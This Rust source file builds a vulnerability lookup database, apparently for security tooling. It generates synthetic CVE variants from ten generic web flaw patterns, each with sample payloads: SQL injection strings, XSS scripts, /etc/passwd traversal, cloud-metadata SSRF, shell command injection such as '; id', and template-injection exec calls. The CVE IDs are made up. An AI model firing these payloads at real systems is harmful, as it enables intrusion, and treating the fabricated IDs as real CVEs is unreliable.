/// Build the full CVE database with synthetic variants for coverage.
pub fn get_cve_database() -> Vec<CveEntry> {
    let mut db = base_cves();
    db.extend(synthetic_cve_variants());
    db
}

fn synthetic_cve_variants() -> Vec<CveEntry> {
    let patterns: Vec<(&str, &str, &str, &str, &str, u32, &str, &str, &str, f32, &str, &str, &[&str])> = vec![
        ("CVE-2024-1001", "Generic SQLi", "SQL injection in web application query handler", "Generic Web App", "A03:2021-Injection", 89, "SQLi", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8, "' OR '1'='1", "' UNION SELECT null,null--", &["sqli", "generic"]),
        ("CVE-2024-1002", "Generic XSS", "Reflected XSS via unsanitized search parameter", "Generic Web App", "A03:2021-Injection", 79, "Reflected-XSS", "High", "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 8.1, "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", &["xss", "generic"]),
        ("CVE-2024-1003", "Generic Path Traversal", "Directory traversal in file download endpoint", "Generic Web App", "A01:2021-Broken-Access-Control", 22, "Path-Traversal", "High", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", 7.5, "../../../etc/passwd", "..%2f..%2fetc%2fpasswd", &["path-traversal", "generic"]),
        ("CVE-2024-1004", "Generic SSRF", "Server-side request forgery in URL fetcher", "Generic Web App", "A10:2021-Server-Side-Request-Forgery", 918, "SSRF", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8, "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", &["ssrf", "generic"]),
        ("CVE-2024-1005", "Generic Command Injection", "OS command injection in ping utility", "Generic Web App", "A03:2021-Injection", 77, "Command-Injection", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8, "127.0.0.1; id", "| whoami", &["command-injection", "generic"]),
        ("CVE-2024-1006", "Generic SSTI", "Server-side template injection in email renderer", "Generic Web App", "A03:2021-Injection", 94, "SSTI", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8, "{{7*7}}", "${T(java.lang.Runtime).getRuntime().exec('id')}", &["ssti", "generic"]),
        ("CVE-2024-1007", "Generic Deserialization", "Java deserialization in session cookie", "Generic Web App", "A08:2021-Software-and-Data-Integrity-Failures", 502, "Deserialization", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8, "rO0ABXNyABFqYXZh...", "aced0005...", &["deserialization", "generic"]),
        ("CVE-2024-1008", "Generic IDOR", "Insecure direct object reference in invoice endpoint", "Generic Web App", "A01:2021-Broken-Access-Control", 639, "IDOR", "Medium", "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 6.5, "/invoice/1234", "/invoice/1235", &["idor", "generic"]),
        ("CVE-2024-1009", "Generic JWT Algorithm Confusion", "JWT algorithm confusion with none/HS256", "Generic Auth Library", "A07:2021-Identification-and-Authentication-Failures", 345, "JWT-None", "High", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 8.1, "alg=none", "alg=HS256", &["jwt", "generic"]),
        ("CVE-2024-1010", "Generic CORS", "CORS misconfiguration allowing arbitrary origins", "Generic Web App", "A05:2021-Security-Misconfiguration", 942, "CORS", "Medium", "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", 6.1, "Origin: https://evil.com", "Origin: null", &["cors", "generic"]),
    ];

    let mut variants = Vec::with_capacity(100);
    for round in 0..10 {
        for (idx, pattern) in patterns.iter().enumerate() {
            let (base_id, name, desc, comp, owasp, cwe, attack, severity, vector, score, p1, p2, tags) = pattern;
            let new_id = format!("{}-{}", base_id, 1001 + round * 100 + idx);
            variants.push(CveEntry {
                cve_id: new_id,
                known_exploited: (round + idx) % 4 == 0,
                name: name.to_string(),
                description: format!("{} (variant {})", desc, round * 10 + idx),
                affected_component: comp.to_string(),
                affected_versions: vec!["1.0.0".into(), "2.0.0".into()],
                cwe_id: *cwe,
                attack_type: attack.to_string(),
                cvss_score: *score,
                cvss_vector: vector.to_string(),
                severity: severity.to_string(),
                exploit_urls: vec![format!("https://www.exploit-db.com/search?cve={}", base_id.replace("CVE-", "20"))],
                metasploit_modules: vec![],
                nuclei_templates: vec![format!("cves/2024/{}.yaml", base_id.to_lowercase().replace("-", "_"))],
                detection_signatures: vec![format!("pattern-{}", idx)],
                payload_examples: vec![p1.to_string(), p2.to_string()],
                remediation: "Apply vendor patches and validate input.".into(),
                patch_urls: vec![],
                tags: tags.iter().map(|s| s.to_string()).collect(),
                owasp_category: owasp.to_string(),
            });
        }
    }
    variants
}

/// Lookup a single CVE by ID.
pub fn lookup_cve(cve_id: &str) -> Option<CveEntry> {
    get_cve_database().into_iter().find(|e| e.cve_id.eq_ignore_ascii_case(cve_id))
}

/// Find CVEs matching a specific attack type.
pub fn find_by_attack_type(attack_type: &str) -> Vec<CveEntry> {
    get_cve_database()
        .into_iter()
        .filter(|e| e.attack_type.eq_ignore_ascii_case(attack_type))
        .collect()
}

/// Find CVEs affecting a component name substring.
pub fn find_by_component(component: &str) -> Vec<CveEntry> {
    let lower = component.to_lowercase();
    get_cve_database()
        .into_iter()
        .filter(|e| e.affected_component.to_lowercase().contains(&lower))
        .collect()
}
